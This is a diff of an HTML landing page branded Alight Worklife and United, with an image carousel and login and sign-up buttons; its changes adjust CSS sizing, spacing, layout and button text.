@@ -21,14 +21,14 @@
         /* LOGO - Top Layer */
         .logo-container {
             text-align: center;
-            padding: 30px 20px 20px;
+            padding: 25px 20px 15px;
             z-index: 30;
             position: relative;
-            background: rgba(0, 0, 0, 0.4);
+            background: rgba(0, 0, 0, 0.35);
         }
 
         .alight-worklife {
-            font-size: 2.4rem;
+            font-size: 2.3rem;
             font-weight: 700;
             letter-spacing: -0.02em;
             margin-bottom: 8px;
@@ -45,24 +45,24 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 12px;
-            margin-top: 8px;
+            gap: 10px;
+            margin-top: 6px;
         }
         .united-logo .united-text {
-            font-size: 2.1rem;
+            font-size: 2rem;
             font-weight: 800;
             color: #0033a0;
             letter-spacing: 0.05em;
         }
-        .globe { font-size: 2.3rem; line-height: 1; }
+        .globe { font-size: 2.2rem; line-height: 1; }
 
-        /* CAROUSEL */
+        /* CAROUSEL - Full screen background */
         .carousel {
             position: absolute;
             top: 0;
             left: 0;
             right: 0;
-            bottom: 180px; /* Space for buttons */
+            bottom: 0;
             overflow: hidden;
             z-index: 1;
         }
@@ -86,7 +86,7 @@
             content: '';
             position: absolute;
             top: 0; left: 0; right: 0; bottom: 0;
-            background: linear-gradient(transparent, rgba(0,0,0,0.8));
+            background: linear-gradient(transparent, rgba(0,0,0,0.75));
         }
         .slide-content {
             position: relative;
@@ -95,27 +95,27 @@
         }
         .slide h2 {
             font-size: 2rem;
-            margin-bottom: 30px;
+            margin-bottom: 25px;
         }
         .slide p {
-            font-size: 1.15rem;
-            line-height: 1.4;
+            font-size: 1.1rem;
+            line-height: 1.45;
         }
 
         /* DOTS */
         .dots {
             text-align: center;
-            margin: 15px 0;
+            margin: 12px 0;
             z-index: 25;
             position: relative;
         }
         .dot {
             display: inline-block;
-            width: 10px;
-            height: 10px;
+            width: 9px;
+            height: 9px;
             background: #1ea05d;
             border-radius: 50%;
-            margin: 0 5px;
+            margin: 0 4px;
             cursor: pointer;
         }
         .dot.active {
@@ -123,27 +123,26 @@
             transform: scale(1.3);
         }
 
-        /* BUTTONS - Fixed at bottom */
+        /* BUTTONS - Smaller & Higher */
         .buttons {
             position: absolute;
-            bottom: 0;
+            bottom: 25px;
             left: 0;
             right: 0;
-            padding: 20px 25px 40px;
+            padding: 0 25px;
             display: flex;
-            gap: 15px;
-            background: rgba(0, 0, 0, 0.6);
+            gap: 14px;
             z-index: 30;
         }
         .btn {
             flex: 1;
-            padding: 18px;
+            padding: 14px 20px;
             border-radius: 50px;
-            font-size: 1.15rem;
+            font-size: 1.1rem;
             font-weight: 600;
             text-align: center;
             cursor: pointer;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
         }
         .btn-login {
             background: white;
@@ -154,16 +153,17 @@
             color: white;
         }
         .under {
-            font-size: 0.85rem;
-            margin-top: 4px;
-            opacity: 0.9;
+            font-size: 0.8rem;
+            margin-top: 3px;
+            opacity: 0.85;
         }
 
         /* Mobile Optimizations */
         @media (max-width: 480px) {
-            .alight-worklife { font-size: 2.1rem; }
-            .united-logo .united-text { font-size: 1.9rem; }
-            .slide h2 { font-size: 1.8rem; }
+            .alight-worklife { font-size: 2.05rem; }
+            .united-logo .united-text { font-size: 1.85rem; }
+            .slide h2 { font-size: 1.75rem; }
+            .btn { font-size: 1.05rem; padding: 13px 18px; }
         }
     </style>
 </head>
@@ -173,7 +173,7 @@
     <div class="logo-container">
         <div class="alight-worklife">
             <span class="alight">alight</span>
-            <span class="worklife">worklife</span><span style="font-size:0.55rem; vertical-align: super; color:#1a1a1a;">®</span>
+            <span class="worklife">worklife</span><span style="font-size:0.5rem; vertical-align: super; color:#1a1a1a;">®</span>
         </div>
 
         <div class="united-logo">
@@ -182,7 +182,7 @@
         </div>
     </div>
 
-    <!-- Carousel -->
+    <!-- Carousel - Full height background -->
     <div class="carousel">
         <div class="slides" id="slides">
             <!-- Slide 1 -->
@@ -217,7 +217,7 @@
     <!-- Buttons -->
     <div class="buttons">
         <div class="btn btn-login" onclick="goToLogin()">
-            Alight Worklife login
+            LOGIN
             <p class="under"></p>
         </div>
         <div class="btn btn-signup" onclick="goToSignup()">SIGN UP</div>
